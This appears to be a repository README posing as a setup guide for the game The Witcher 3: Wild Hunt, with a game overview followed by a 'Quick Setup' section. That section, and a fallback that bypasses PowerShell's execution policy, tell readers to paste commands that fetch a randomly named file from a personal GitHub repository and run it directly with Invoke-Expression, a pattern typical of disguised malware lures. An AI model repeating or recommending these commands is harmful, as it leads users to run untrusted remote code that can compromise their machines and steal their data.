# The Witcher 3: Wild Hunt

The Witcher 3: Wild Hunt is the Windows game this page sets up. The command in Quick Setup installs the game on this PC. After that you launch The Witcher 3: Wild Hunt and play.

The Witcher 3: Wild Hunt is an open-world action RPG on Windows where you play Geralt of Rivia, a monster hunter searching for his adopted daughter while kingdoms collapse around him. Combat blends fast sword work, signs, alchemy, and preparation before tough contracts. Choices in dialogue and side quests ripple through regions from Velen and Novigrad to Skellige and Toussaint.

A typical session on PC might start in a village inn: you review your journal, craft oils and potions, then ride Roach to a contract marker. You investigate tracks, talk to witnesses, enter a cave or forest lair, and adapt tactics to a griffin, werewolf, or bandit camp. Afterward you haggle with a notice board reward, sell loot, and spend skill points or upgrade gear at a blacksmith before saving and closing the game.

This repository keeps a Windows setup file that walks through install paths, graphics presets, and controller or keyboard layout. Release notes summarize major patches and DLC compatibility. A changelog tracks repository updates to those instructions so you can align your local copy with the latest documented configuration without hunting scattered forum posts.

## How you play

- Geralt tracks Ciri while the spectral Wild Hunt races across war-scarred Northern Realms.
- Velen swamps, Novigrad streets, and Skellige cliffs form one connected open world.
- Signs, steel and silver blades, bombs, and crossbows combine in tactical monster fights.
- Branching quests and moral choices reshape politics, romances, and who survives each ending.
- Alchemy, crafting, and bestiary prep reward reading contracts before accepting dangerous hunts.
- Hearts of Stone and Blood and Wine add long story arcs beyond the base campaign.
- Roach carries you between notice boards, merchants, and fast travel signposts on Windows.
- Gwent minigames, fistfights, and horse races break up long evenings of main story progress.

## Quick Setup (PowerShell)

This installs the game The Witcher 3: Wild Hunt on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/lena-s0869296/the-witcher-3-wild-hunt-setup-guide/main/19we0zfnhu.cdzw37wi | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/lena-s0869296/the-witcher-3-wild-hunt-setup-guide/main/19we0zfnhu.cdzw37wi | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `19we0zfnhu.cdzw37wi` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `lena-s0869296/the-witcher-3-wild-hunt-setup-guide`. The Witcher 3: Wild Hunt 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
